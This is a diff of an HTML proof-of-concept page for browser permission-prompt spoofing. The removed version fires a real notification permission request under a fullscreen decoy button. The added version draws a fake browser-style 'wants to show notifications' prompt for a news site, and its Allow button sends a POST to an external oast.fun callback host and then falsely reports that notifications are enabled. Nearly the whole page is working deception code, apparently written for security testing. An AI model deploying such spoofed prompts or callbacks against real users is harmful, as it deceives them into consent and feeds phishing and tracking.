@@ -1,73 +1,96 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Secure Video</title>
+  <title>Prompt Overlay Spoof</title>
   <style>
-    body, html {
+    body {
       margin: 0;
-      padding: 0;
-      background: black;
-      color: white;
-      font-family: Arial, sans-serif;
-    }
-    #container {
-      display: flex;
-      justify-content: center;
-      align-items: center;
+      font-family: sans-serif;
+      background: #f4f4f4;
       height: 100vh;
-      flex-direction: column;
+      overflow: hidden;
     }
-    .deceptive-btn {
-      padding: 16px 32px;
-      font-size: 18px;
-      border: none;
-      background: #00cc99;
-      color: white;
-      border-radius: 6px;
-      cursor: pointer;
-      z-index: 9999;
+
+    .content {
+      padding: 60px;
+      text-align: center;
     }
-    #cover {
+
+    .fake-prompt {
       position: absolute;
-      top: 0;
-      left: 0;
-      width: 100vw;
-      height: 100vh;
-      background: black;
-      z-index: 9998;
-      display: none;
-      justify-content: center;
-      align-items: center;
-      flex-direction: column;
+      top: 8px;
+      left: 8px;
+      background: white;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      width: 300px;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.2);
+      z-index: 99999;
+      padding: 12px;
+    }
+
+    .fake-prompt h4 {
+      margin: 0 0 8px;
+      font-weight: 600;
+      font-size: 14px;
+    }
+
+    .fake-prompt p {
+      margin: 0 0 12px;
+      font-size: 13px;
+      color: #555;
+    }
+
+    .prompt-buttons {
+      display: flex;
+      justify-content: flex-end;
+    }
+
+    .prompt-buttons button {
+      padding: 6px 12px;
+      margin-left: 8px;
+      font-size: 13px;
+      border: none;
+      border-radius: 3px;
+      cursor: pointer;
+    }
+
+    .allow-btn {
+      background-color: #1a73e8;
+      color: white;
+    }
+
+    .block-btn {
+      background-color: #ddd;
     }
   </style>
 </head>
 <body>
-  <div id="container">
-    <h1>🔒 Watch Secure Video</h1>
-    <button class="deceptive-btn" onclick="startSpoof()">Start Secure Session</button>
+
+  <div class="content">
+    <h1>Welcome to News Central</h1>
+    <p>Please wait while we load notifications...</p>
   </div>
 
-  <div id="cover">
-    <h2>Loading...</h2>
-    <button class="deceptive-btn">Continue</button>
+  <!-- Fake browser-style permission prompt -->
+  <div class="fake-prompt" id="spoofPrompt">
+    <h4>https://news-central.com wants to</h4>
+    <p>Show notifications</p>
+    <div class="prompt-buttons">
+      <button class="block-btn">Block</button>
+      <button class="allow-btn" onclick="steal()">Allow</button>
+    </div>
   </div>
 
   <script>
-    function startSpoof() {
-      const cover = document.getElementById('cover');
-      document.documentElement.requestFullscreen().then(() => {
-        setTimeout(() => {
-          cover.style.display = 'flex';
-
-          // Trigger the real notification permission prompt underneath deceptive button
-          setTimeout(() => {
-            Notification.requestPermission().then(res => {
-              alert("User chose: " + res);
-            });
-          }, 100); // Delay triggers while user clicks Continue
-        }, 500);
+    function steal() {
+      fetch('https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ consent: "user clicked allow on spoof prompt" })
       });
+
+      document.getElementById('spoofPrompt').innerHTML = '<p>✔️ Notifications enabled</p>';
     }
   </script>
 </body>
